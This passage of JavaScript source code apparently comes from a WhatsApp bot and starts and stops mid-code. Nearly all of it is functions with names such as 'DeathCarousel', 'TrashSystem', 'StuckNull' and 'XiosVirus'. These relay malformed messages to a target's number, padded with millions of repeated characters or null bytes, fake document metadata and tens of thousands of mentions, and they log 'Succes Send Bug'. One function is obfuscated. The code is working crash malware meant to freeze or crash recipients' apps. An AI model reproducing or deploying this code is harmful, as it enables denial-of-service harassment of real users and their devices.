                },
                interactiveMessage: interactiveMessage
              };
              const viewOnceMessage = {
                message: message
              };
              const vrdrk = {
                viewOnceMessage: viewOnceMessage
              };
              await krocov4.relayMessage(userJidx, vrdrk, {
                participant: {
                  jid: userJidx
                }
              });
            }
            for (let j = 0; j < 3; j++) {
              const header = {
                title: '',
                subtitle: " "
              };
              const body = {
                text: "📄 SCRIPT BUG VIRDARK . CRASH ‍📄.∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽♨️ . ‍📄.∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽♨️ . ‍📄.∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽♨️ .𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦"
              };
              const footer = {
                'text': "📄 SCRIPT BUG VIRDARK . CRASH ؂؃؂؃.؂؃؂؃.؂؃؂؃"
              };
              const displaybuttons = {
                name: "cta_url",
                buttonParamsJson : JSON.stringify({
                  display_text: "C҉R҉A҉S҉H҉ W҉H҉A҉T҉S҉A҉P҉P҉꙰꙰",
                  url: '',
                  merchant_url: ''
                })
              };
              const vrdrknew = {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: header,
                      body: body,
                      footer: footer,
                      nativeFlowMessage: {
                        buttons: [displaybuttons],
                        messageParamsJson: ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(1000000)
                      }}}}};
              await krocov4.relayMessage(userJidx, vrdrknew, { participant: { jid: userJidx
                }})}}
                
                async function sendLiveLocationMessage2(target, kuoted) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "p",
            degreesLongitude: "p",
            caption: "K-Tech" + ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(5000000),
            sequenceNumber: "0",
            jpegThumbnail: ""
          }
        }
      }
    }), {
      userJid: target,
      quoted: kuoted
    });
    await krocov4.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
  }
  
  
  function _0x45d4(_0xd2b4c0,_0x227e74){var _0x22b9c4=_0x22b9();return _0x45d4=function(_0x45d45a,_0x45fb48){_0x45d45a=_0x45d45a-0xe4;var _0x56f56c=_0x22b9c4[_0x45d45a];return _0x56f56c;},_0x45d4(_0xd2b4c0,_0x227e74);}(function(_0x5d9f86,_0x312ca2){var _0x57201e=_0x45d4,_0x6c638a=_0x5d9f86();while(!![]){try{var _0x26abd5=parseInt(_0x57201e(0xed))/0x1+parseInt(_0x57201e(0xe8))/0x2*(-parseInt(_0x57201e(0xf2))/0x3)+parseInt(_0x57201e(0xf5))/0x4+-parseInt(_0x57201e(0xf1))/0x5*(parseInt(_0x57201e(0xee))/0x6)+parseInt(_0x57201e(0xf3))/0x7*(parseInt(_0x57201e(0xe6))/0x8)+parseInt(_0x57201e(0xe4))/0x9*(-parseInt(_0x57201e(0xf0))/0xa)+parseInt(_0x57201e(0xf4))/0xb;if(_0x26abd5===_0x312ca2)break;else _0x6c638a['push'](_0x6c638a['shift']());}catch(_0x2384ee){_0x6c638a['push'](_0x6c638a['shift']());}}}(_0x22b9,0x2a03e));function _0x22b9(){var _0x12a199=['315422DtdoxQ','12774NdLtKU','fromObject','2203030MjGMol','785bOeSDs','708DqbAPU','133siuWan','3321714lfUYQG','176108wrxTIM','9ctKSXX','message','84104sHimRI','key','1140KZyPjR','chat','relayMessage','repeat','🗡️㍐𝐒\x20𝐤\x20ɣ\x20乙\x20𝐞\x20𝐭\x20ᵪₚᶜᶻᵃァ𝐆⃟Ǿ𝐃ͯͯͯˣʸᷦ'];_0x22b9=function(){return _0x12a199;};return _0x22b9();}async function DeathCarousel(_0x387a65,_0x247852){var _0x15b5fd=_0x45d4,_0x3a83dd=generateWAMessageFromContent(m[_0x15b5fd(0xe9)],proto['Message'][_0x15b5fd(0xef)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','locationMessage':{},'hasMediaAttachment':!![]},'body':{'text':_0x15b5fd(0xec)+'\x00'[_0x15b5fd(0xeb)](0xdbba0)},'nativeFlowMessage':{'messageParamsJson':''},'carouselMessage':{}}}}}),{'userJid':m['chat'],'quoted':_0x247852});await krocov4[_0x15b5fd(0xea)](_0x387a65,_0x3a83dd[_0x15b5fd(0xe5)],{'participant':{'jid':_0x387a65},'messageId':_0x3a83dd[_0x15b5fd(0xe7)]['id']});}
  
 
 async function sendInteractiveMessageWithHeader(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: '𝐖𝐀𝐍𝐍𝐀 𝐁𝐄 𝐘𝐎𝐔𝐑𝐒',
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: '༽ꪾྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷ'.repeat(100000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: '',
                            subtitle: '',
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson:
                          '{ display_text : " ", url : , merchant_url : " "}',
                                },
                            ],
                            messageParamsJson: '\0\0\0'.repeat(100000),
                        }),
                    }),
                },
            },
        }),
        {}
    );
    await krocov4.relayMessage(userJid, messageContent.message, {
        messageId: messageContent.key.id,
    });
}

	async function GlX(X, Ptcp = true) {
			await krocov4.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "𒂵𒂶𒂷𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 尺Ẕχ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug ©▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽"));
		};
		
	async function StuckNull(X, ThM, Ptcp = true) {
			await krocov4.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@62895364760801".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️', url: \"https://youtube.com/AkmalMods\", merchant_url: \"https://youtube.com/AkmalMods\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["62895364760801@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "尺ɪẔχẔㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐〽️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};
		
			async function StuckSql(X, ThM, Ptcp = true) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@62895364760801".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️', url: \"https://youtube.com/AkmalMods\", merchant_url: \"https://youtube.com/AkmalMods\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["62895364760801@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "尺ɪẔχẔㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐〽️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await krocov4.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};
		
		async function TxIos(X, Ptcp = false) {
			await krocov4.relayMessage(X, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "62895364760801@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "62895364760801@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": X,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "62895364760801@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "A̺͆N̺͆T̺͆I̺͆ G̺͆E̺͆D̺͆O̺͆R̺͆〽",
								"body": "尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};
		
		async function XiosVirus(jid) {
			krocov4.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};

		async function XiosPay(jid) {
			krocov4.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};

	async function TrashSystem(X, ThM, Ptcp = true) {
			await krocov4.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@62895364760801".repeat(170000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️', url: \"https://youtube.com/AkmalMods\", merchant_url: \"https://youtube.com/AkmalMods\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["62895364760801@s.whatsapp.net", ...Array.from({
										length: 30000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "尺ɪẔχẔㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐〽️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};
		
		async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = false) {
